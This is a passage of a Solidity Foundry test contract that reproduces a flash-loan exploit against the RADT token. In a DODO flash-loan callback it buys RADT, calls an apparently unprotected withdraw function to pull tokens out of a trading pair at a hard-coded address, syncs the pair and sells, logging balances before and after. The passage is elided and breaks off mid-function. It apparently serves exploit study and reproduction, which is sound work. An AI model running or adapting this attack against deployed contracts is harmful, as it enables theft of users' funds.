...
contract ContractTest is DSTest {
    ...
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        emit log_named_decimal_uint("[Flashloan] Attacker USDT balance after flashloan", USDT.balanceOf(address(this)), 18);
        buyRADT();
        USDT.transfer(address(pair), 1);
        uint256 amount = RADT.balanceOf(address(pair)) * 100 / 9;
        emit log_named_decimal_uint("Before Withdraw", USDT.balanceOf(address(pair)), 18);
        emit log_named_decimal_uint("Before Withdraw", RADT.balanceOf(address(pair)), 18);
        emit log_named_decimal_uint("Before Withdraw", USDT.balanceOf(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), 18);
        emit log_named_decimal_uint("Before Withdraw", RADT.balanceOf(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), 18);
        wrap.withdraw(address(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), address(pair), amount);
        emit log_named_decimal_uint("After Withdraw", USDT.balanceOf(address(pair)), 18);
        emit log_named_decimal_uint("After Withdraw", RADT.balanceOf(address(pair)), 18);
        emit log_named_decimal_uint("After Withdraw", USDT.balanceOf(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), 18);
        emit log_named_decimal_uint("After Withdraw", RADT.balanceOf(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), 18);
        pair.sync();
        sellRADT();
